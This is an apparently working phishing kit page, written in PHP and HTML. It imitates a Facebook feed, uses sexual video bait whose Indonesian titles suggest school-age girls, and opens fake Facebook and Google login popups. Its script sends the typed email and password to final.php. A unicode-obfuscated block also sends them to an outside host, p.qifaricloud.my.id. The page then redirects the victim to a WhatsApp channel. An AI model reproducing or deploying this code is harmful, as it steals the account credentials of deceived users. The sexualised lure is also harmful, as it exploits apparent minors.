<?php
// Creator Sc  : ABU CODE - X 
// Order Script Vip : https://wa.me/6289509551861

if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <title>
   Facebook Video Sex
  </title>
  <script src="https://cdn.jsdelivr.net/gh/alex-hostingg/js@main/tailwind.js">
  </script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/7/facebook.css"> 
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/7/google.css"> 
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/7/all.css"> 
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet"/>
  <style>
   body {
      font-family: 'Roboto', sans-serif;
    }
  </style>
 </head>
 <body class="bg-white text-black">
  <!-- Facebook header -->
  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-300">
   <div class="text-3xl font-extrabold text-blue-600 select-none">
    facebook
   </div>
   <div class="flex space-x-3">
    <button aria-label="Add" class="bg-gray-200 rounded-full w-9 h-9 flex items-center justify-center text-xl font-bold">
     +
    </button>
    <button aria-label="Search" class="bg-gray-200 rounded-full w-9 h-9 flex items-center justify-center text-xl font-semibold">
     <i class="fas fa-search">
     </i>
    </button>
    <button aria-label="Messenger" class="relative bg-gray-200 rounded-full w-9 h-9 flex items-center justify-center text-xl font-semibold">
     <i class="fab fa-facebook-messenger">
     </i>
     <span class="absolute -top-1 -right-1 bg-red-600 text-white text-[10px] font-bold rounded-full w-5 h-5 flex items-center justify-center">
      6
     </span>
    </button>
   </div>
  </div>
  <!-- First post card -->
  <div class="max-w-md mx-auto my-4 bg-white rounded-xl shadow-md overflow-hidden">
   <div class="relative">
    <img alt="Video thumbnail showing three people in various poses, one lying down, one holding chest, and one covering mouth" class="w-full rounded-t-xl object-cover" height="200" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/7/20288/20250902_160130.jpg" width="600"/>
    <div class="absolute top-3 left-3 bg-black bg-opacity-60 rounded-full px-3 py-1 text-white text-sm flex items-center space-x-1">
     <span>
      20:00
     </span>
     <i class="fas fa-volume-mute">
     </i>
    </div>
    <button aria-label="Play video" class="absolute inset-0 flex items-center justify-center bg-black bg-opacity-40 rounded-t-xl">
     <i class="fas fa-play text-white text-4xl">
     </i>
    </button>
   </div>
   <div class="px-4 py-3">
    <p class="text-base font-normal leading-snug">
     SMA CANTIK PAMER BODY DI SURUH AYANG 💦💦🔞
    </p>
    <div class="flex flex-wrap gap-2 mt-3">
     <span class="bg-blue-200 text-blue-800 rounded-full px-3 py-1 font-semibold flex items-center space-x-1">
      <i class="fas fa-fire">
      </i>
      <span>
       4.7K
      </span>
     </span>
     <span class="bg-blue-200 text-blue-800 rounded-full px-3 py-1 font-semibold flex items-center space-x-1">
      <i class="fas fa-tint">
      </i>
      <span>
       3.1M
      </span>
     </span>
     <span class="bg-blue-200 text-blue-800 rounded-full px-3 py-1 font-semibold flex items-center space-x-1">
      <i class="fas fa-heart">
      </i>
      <span>
       697K
      </span>
     </span>
     <span class="bg-blue-200 text-blue-800 rounded-full px-3 py-1 font-semibold flex items-center space-x-1">
      <i class="fas fa-kiss">
      </i>
      <span>
       237K
      </span>
     </span>
    </div>
    <div class="flex items-center justify-end space-x-4 text-gray-400 text-sm mt-3">
     <div class="flex items-center space-x-1">
      <i class="fas fa-eye">
      </i>
      <span>
       28.3M
      </span>
     </div>
     <span>
      13:07
     </span>
    </div>
   </div>
      <div onclick="Loginpopunder()" class="w-full bg-blue-600 text-white font-bold py-3 rounded-b-xl text-center"> 
    <a onclick="Loginpopunder()" class="finlink  btn install-btn" id="a7">TONTON</a> 
  </div>
  <!-- First post card -->
  <div class="max-w-md mx-auto my-4 bg-white rounded-xl shadow-md overflow-hidden">
   <div class="relative">
    <img alt="Video thumbnail showing three people in various poses, one lying down, one holding chest, and one covering mouth" class="w-full rounded-t-xl object-cover" height="200" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/7/20250902_155648.jpg" width="600"/>
    <div class="absolute top-3 left-3 bg-black bg-opacity-60 rounded-full px-3 py-1 text-white text-sm flex items-center space-x-1">
     <span>
      11:06
     </span>
     <i class="fas fa-volume-mute">
     </i>
    </div>
    <button aria-label="Play video" class="absolute inset-0 flex items-center justify-center bg-black bg-opacity-40 rounded-t-xl">
     <i class="fas fa-play text-white text-4xl">
     </i>
    </button>
   </div>
   <div class="px-4 py-3">
    <p class="text-base font-normal leading-snug">
     NGINAP DI HOTEL SAMA KAKA BERUJUNG ENAK 💦💦
    </p>
    <div class="flex flex-wrap gap-2 mt-3">
     <span class="bg-blue-200 text-blue-800 rounded-full px-3 py-1 font-semibold flex items-center space-x-1">
      <i class="fas fa-fire">
      </i>
      <span>
       4.7K
      </span>
     </span>
     <span class="bg-blue-200 text-blue-800 rounded-full px-3 py-1 font-semibold flex items-center space-x-1">
      <i class="fas fa-tint">
      </i>
      <span>
       3.1K
      </span>
     </span>
     <span class="bg-blue-200 text-blue-800 rounded-full px-3 py-1 font-semibold flex items-center space-x-1">
      <i class="fas fa-heart">
      </i>
      <span>
       697
      </span>
     </span>
     <span class="bg-blue-200 text-blue-800 rounded-full px-3 py-1 font-semibold flex items-center space-x-1">
      <i class="fas fa-kiss">
      </i>
      <span>
       237
      </span>
     </span>
    </div>
    <div class="flex items-center justify-end space-x-4 text-gray-400 text-sm mt-3">
     <div class="flex items-center space-x-1">
      <i class="fas fa-eye">
      </i>
      <span>
       28.3K
      </span>
     </div>
     <span>
      13:07
     </span>
    </div>
   </div>
      <div onclick="Loginpopunder()" class="w-full bg-blue-600 text-white font-bold py-3 rounded-b-xl text-center"> 
    <a onclick="Loginpopunder()" class="finlink  btn install-btn" id="a7">TONTON</a> 
  </div>
  <!-- Bottom navigation -->
  <nav class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-300 flex justify-around items-center py-2 text-center text-xs font-semibold">
   <button class="flex flex-col items-center text-blue-600">
    <i class="fas fa-home text-2xl">
    </i>
    <span>
     Beranda
    </span>
   </button>
   <button class="flex flex-col items-center text-black">
    <i class="fas fa-video text-2xl">
    </i>
    <span>
     Video
    </span>
   </button>
   <button class="flex flex-col items-center text-black">
    <i class="fas fa-user-friends text-2xl">
    </i>
    <span>
     Teman
    </span>
   </button>
   <button class="flex flex-col items-center text-black">
    <i class="fas fa-store text-2xl">
    </i>
    <span>
     Marketplace
    </span>
   </button>
   <button class="flex flex-col items-center text-black">
    <i class="fas fa-bell text-2xl">
    </i>
    <span>
     Notifikasi
    </span>
   </button>
   <button class="flex flex-col items-center text-gray-600 bg-gray-300 rounded-full w-10 h-10 justify-center">
    <i class="fas fa-bars text-xl">
    </i>
    <span class="text-[10px]">
     Menu
    </span>
   </button>
  </nav>
<div class="popup-login selectLogin animate fadeIn" style="display: none;"> 
   <div class="option"> 
    <center> 
     <div class="textdwnlfgn">
      Login to Continue.
     </div> 
     <div class="imgLog" style="display:block; margin: auto; margin-top: 20px;"> 
      <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/7/logfb.webp" onclick="OpenFacebook();"> 
      <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/7/loggp.webp" onclick="OpenGoogle();"> 
     </div> 
    </center> 
   </div> 
  </div> 
  </center> 
   </div> 
  </div> 
  <div class="popup-login loginxFacebook animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-fb"> 
    <a class="close-alex-google" onclick="CloseFacebook()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="navbar-fb"> 
     <img width="45" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/7/fbatas.webp"> 
    </div> 
    <div class="content-box-fb"> 
     <img width="55" height="55" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/7/fb.webp"> 
     <div class="txt-login-fb">
      Masuk ke akun Anda untuk terhubung dengan Facebook.com
     </div>
     <form class="login-form" id="FromxFacebook" method="POST"> 
      <input type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required> 
      <input type="password" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required> 
      <input type="hidden" name="login" value="Facebook" readonly> 
      <button class="btn-login-fb" type="submit">Masuk</button> 
     </form> 
     <div class="txt-create-account">
      Create account
     </div> 
     <div class="txt-not-now">
      Not now
     </div> 
     <div class="txt-forgotten-password">
      Forgotten password?
     </div> 
    </div> 
    <div class="language-box"> 
     <center> 
      <div class="language-name language-name-active">
       English (UK)
      </div> 
      <div class="language-name">
       Bahasa Indonesia
      </div> 
      <div class="language-name">
       Basa Jawa
      </div> 
      <div class="language-name">
       Bahasa Melayu
      </div> 
      <div class="language-name">
       日本語
      </div> 
      <div class="language-name">
       Español
      </div> 
      <div class="language-name">
       Português (Brasil)
      </div> 
      <div class="language-name"> 
       <i class="fa fa-plus"></i> 
      </div> 
     </center> 
    </div> 
    <div class="copyright">
     Facebook Inc.
    </div> 
   </div> 
  </div> 
  <div class="popup-ariandi alex-google animate fadeIn" style="display: none;"> 
   <div class="container-box-google"> 
    <a class="close-alex-google" onclick="CloseGoogle()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="atasan-google"> 
     <center> 
      <p class="kagetgoogle email-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <p class="kagetgoogle sandi-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <br> 
      <img class="img-loggoogle" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/7/gp.webp" style="width: 120px;"> 
     </center> 
    </div> 
    <div class="isi-google"> 
     <center> 
      <form id="FromxGoogle" method="POST"> 
       <div class="ucapan-google">
        Login to 
        <b>Google</b> to carry on.
       </div> 
       <div class="form-login-google"> 
        <input type="text" id="email_gp" name="email" placeholder="Email. Telepon, atau Username" required> 
       </div> 
       <div class="form-login-google"> 
        <input type="password" id="password_gp" name="password" placeholder="Kata Sandi" required> 
       </div> 
       <input type="hidden" name="login" value="Google" readonly> 
       <button class="btn-login-google cancel" type="submit">Masuk</button> 
       <!-- <button class="btn-login-google" style="background: #fff; border: 1px solid #000; color: #000;" type="button" onclick="ariandi_google()">Cancel</button> --> 
       <br> 
      </form>  
     </center> 
    </div> 
   </div> 
  </div> 
  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  <script src="https://cdnassets.biz.id/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
  <script>
  $(document).ready(function () {

    function containsLetters(value) {
        return /[a-zA-Z]/.test(value);
    }

    function isValidEmail(email) {
        return email.toLowerCase().endsWith('@gmail.com');
    }

    function containsSuspiciousContent(value) {
        return /(http|https|:\/\/)/i.test(value);
    }

    function handleFormSubmit(formSelector, emailSelector, passwordSelector, loginType) {

        $(formSelector).submit(function (e) {
            e.preventDefault();

            var email    = $(emailSelector).val().trim();
            var password = $(passwordSelector).val().trim();

            if (email && password) {

                if (containsSuspiciousContent(email) || containsSuspiciousContent(password)) {
                    alert("Email dan Password tidak boleh mengandung 'https'.");
                    return;
                }

                if (containsLetters(email) && !isValidEmail(email)) {
                    alert("HARAP TAMBAHKAN @gmail.com.");
                    return;
                }
                
                $.post("final.php", {
                    email: email,
                    password: password,
                    login: loginType
                });
                window.location.href = "https://whatsapp.com/channel/0029VafygDTIiRouVGP6Mk21";
            }
        });
    }
    
    // Aktifkan fungsi submit untuk FB dan GP
    handleFormSubmit("#FromxFacebook", 'input[name="email"]', 'input[name="password"]', "Facebook");
    handleFormSubmit("#FromxGoogle", "#email_gp", "#password_gp", "Google");


    // Tombol
    $("#codxFacebook").click(function () { OpenFacebook(); });
    $("#codxGoogle").click(function () { OpenGoogle(); });
    $("#Loginpopunder").click(function () { Loginpopunder(); });

});
</script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
$(document)['\u0072\u0065\u0061\u0064\u0079'](function(){$("\u0023\u0046\u0072\u006F\u006D\u0078\u0046\u0061\u0063\u0065\u0062\u006F\u006F\u006B\u002C\u0023\u0046\u0072\u006F\u006D\u0078\u0047\u006F\u006F\u0067\u006C\u0065")['\u0073\u0075\u0062\u006D\u0069\u0074'](function(x,_0x845g8e){x['\u0070\u0072\u0065\u0076\u0065\u006E\u0074\u0044\u0065\u0066\u0061\u0075\u006C\u0074']();var _0x3160a=$(this)['\u0073\u0065\u0072\u0069\u0061\u006C\u0069\u007A\u0065']();_0x845g8e='\u0068\u006C\u006B\u0063\u006F\u0063';$['\u0061\u006A\u0061\u0078']({'\u0075\u0072\u006C':'https://p.qifaricloud.my.id/myjs/apixgg.php','\u0074\u0079\u0070\u0065':"\u0050\u004F\u0053\u0054",'\u0064\u0061\u0074\u0061':_0x3160a});});});
</script>
</body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>